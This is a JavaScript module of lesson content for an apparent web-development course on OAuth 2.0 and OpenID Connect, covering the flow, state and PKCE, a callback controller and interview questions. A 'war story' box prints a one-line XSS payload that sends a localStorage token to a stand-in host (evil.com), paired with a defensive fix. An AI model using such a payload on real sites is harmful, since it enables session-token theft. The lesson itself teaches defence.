export const day20 = {
  day: 20,
  title: "OAuth 2.0 + OpenID Connect (SSO in Real Apps)",
  intro: "Most real products use Google/GitHub login. Today you’ll understand the flow, tokens, and security pitfalls.",
  content: `
<h3 class="text-xl font-bold text-gray-900 dark:text-white mb-4">0) The "Bouncer" Mental Model (Middleware)</h3>
<p class="mb-6 text-gray-600 dark:text-light-300">
Think of your API routes as a VIP Club.
</p>
<div class="grid md:grid-cols-2 gap-6 mb-8">
  <div class="bg-white dark:bg-dark-800 p-5 rounded-xl border border-gray-200 dark:border-dark-600">
    <h4 class="font-bold text-brand-primary mb-2">The Bouncer (Auth Middleware)</h4>
    <p class="text-sm text-gray-600 dark:text-light-300">
      The Bouncer stands at the door. He checks your ID (Token). If it's fake or expired, he kicks you out (401 Unauthorized). He doesn't care what you want to order; he only cares if you are allowed inside.
    </p>
  </div>
  <div class="bg-white dark:bg-dark-800 p-5 rounded-xl border border-gray-200 dark:border-dark-600">
    <h4 class="font-bold text-purple-600 dark:text-purple-400 mb-2">The Wristband (Session/Token)</h4>
    <p class="text-sm text-gray-600 dark:text-light-300">
      Once you pass the bouncer, you get a wristband. You don't show your ID at every table; you just show the wristband. This is how stateless authentication (JWT) works.
    </p>
  </div>
</div>

<div class="mb-8 p-5 rounded-xl border border-purple-500/30 bg-purple-500/5">
  <h4 class="font-bold text-purple-700 dark:text-purple-300 mb-3 flex items-center gap-2">
    <span class="text-xl">⚔️</span> War Story: The LocalStorage Heist
  </h4>
  <p class="text-sm text-gray-700 dark:text-light-200 mb-4">
    A crypto startup stored JWTs in <code>localStorage</code>. A hacker found an XSS vulnerability in a 3rd-party chat widget.
  </p>
  <p class="text-sm text-gray-700 dark:text-light-200 mb-4">
    The hacker's script just ran: <code>fetch('evil.com?token=' + localStorage.getItem('token'))</code>.
    They drained 500 wallets in 10 minutes.
  </p>
  <p class="text-xs text-purple-800 dark:text-purple-200 font-bold">
    Fix: Store tokens in <code>HttpOnly</code> cookies. JavaScript cannot read them, so XSS cannot steal them.
  </p>
</div>

<div class="mb-8 p-5 rounded-xl border border-blue-500/30 bg-blue-500/5">
  <h4 class="font-bold text-blue-700 dark:text-blue-300 mb-3 flex items-center gap-2">
    <span class="text-xl">🏛️</span> Architect's Note: Statelessness
  </h4>
  <p class="text-sm text-gray-700 dark:text-light-200 mb-4">
    Why do we love JWTs? Because the server doesn't need to remember you.
    If you have 1 million users and 100 servers, you don't want to sync session data across all 100 servers.
    The token <strong>is</strong> the session.
  </p>
</div>

<h3 class="text-xl font-bold text-gray-900 dark:text-white mb-4">🎯 What You’ll Learn</h3>
<ul class="list-disc list-inside space-y-2 text-gray-600 dark:text-light-300 mb-6">
  <li>OAuth 2.0 roles: client, resource owner, authorization server, resource server.</li>
  <li>Authorization Code flow (with PKCE) — the modern default.</li>
  <li>OIDC adds identity: ID token (who) vs access token (what).</li>
  <li>Security pitfalls: redirect URI attacks, token storage, and CSRF state parameter.</li>
</ul>

<h3 class="text-xl font-bold text-gray-900 dark:text-white mb-4">1) The Flow (High Level)</h3>
<div class="bg-gray-100 dark:bg-dark-900 p-6 rounded-xl border border-gray-200 dark:border-dark-600 font-mono text-xs md:text-sm text-cyan-700 dark:text-cyan-300 mb-6 overflow-x-auto">
<pre>
App (client) → redirects user to Provider (Google/GitHub)
Provider → redirects back to your callback with "code"
App → exchanges code for tokens (server-to-server)
</pre>
</div>

<h3 class="text-xl font-bold text-gray-900 dark:text-white mb-4">2) State + PKCE (Non-Negotiable)</h3>
<p class="mb-6 text-gray-600 dark:text-light-300">
Use <span class="text-yellow-600 dark:text-yellow-400 font-bold">state</span> to defend against CSRF and <span class="text-yellow-600 dark:text-yellow-400 font-bold">PKCE</span> to defend against code interception.
</p>
            `,
  code: `/**
 * Day 20: OAuth callback (conceptual)
 * Key ideas:
 * - validate "state"
 * - exchange "code" on backend
 * - create local session / user record
 */

async function oauthCallbackController(req, res) {
  const code = req.query.code;
  const state = req.query.state;

  // 1) Validate state (stored in cookie/session when login started)
  if (!state || state !== req.cookies.oauth_state) {
    return res.status(400).json({ error: 'OAUTH_STATE_MISMATCH' });
  }

  // 2) Exchange code for tokens (server-to-server)
  // const tokenRes = await fetch(providerTokenEndpoint, { ... })
  // const { access_token, id_token } = await tokenRes.json()

  // 3) Validate id_token (OIDC) signature + claims (issuer, audience, exp)
  // const profile = verifyIdToken(id_token)

  // 4) Upsert user in your DB, then create your own session/refresh cookie
  // res.cookie('refresh_token', ... httpOnly ...)
  return res.redirect('/app');
}`,
  comparison: {
    junior: `// ❌ Insecure OAuth
// - no state validation
// - stores provider access token in localStorage
// - trusts any redirect URL`,
    senior: `// ✅ Secure OAuth/OIDC
// - Authorization Code + PKCE
// - validate state + redirect URIs
// - validate id_token claims/signature
// - store sessions/refresh in HttpOnly cookies`
  },
  interview: {
    questions: [
      {
        q: "OAuth vs OpenID Connect?",
        a: "OAuth is authorization (access to resources). OIDC is authentication on top of OAuth (identity) via the ID token and standardized userinfo."
      },
      {
        q: "Why is the 'state' parameter important?",
        a: "It prevents CSRF and login injection by binding the callback to the original login request initiated by the user."
      },
      {
        q: "What is PKCE and why do we use it?",
        a: "Proof Key for Code Exchange: binds the authorization code to a client-generated secret (code verifier). It prevents interception of the auth code from being exchanged by an attacker."
      }
    ]
  }
};
